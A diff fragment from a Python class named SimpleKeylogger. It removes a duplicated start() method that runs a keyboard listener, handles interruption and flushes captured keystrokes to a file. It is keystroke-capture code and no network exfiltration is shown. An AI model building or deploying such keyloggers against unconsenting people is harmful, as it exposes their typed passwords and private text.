@@ -91,15 +91,4 @@ class SimpleKeylogger:
             self.flush_buffer()
             utils.print_footer(self.start_time, self.key_handler.key_count, self.filename)
 
-        def start(self):
-            try:
-                with keyboard.Listener(on_press=self.on_press) as listener:
-                    listener.join()
-            except KeyboardInterrupt:
-                print("\n\033[1;31m[!]\033[0m Keylogger interrupted by user (Ctrl+C)")
-            finally:
-                self.running = False
-                if self.timer:
-                    self.timer.cancel()
-                self.flush_buffer()
-                utils.print_footer(self.start_time, self.key_handler.key_count, self.filename)
+        
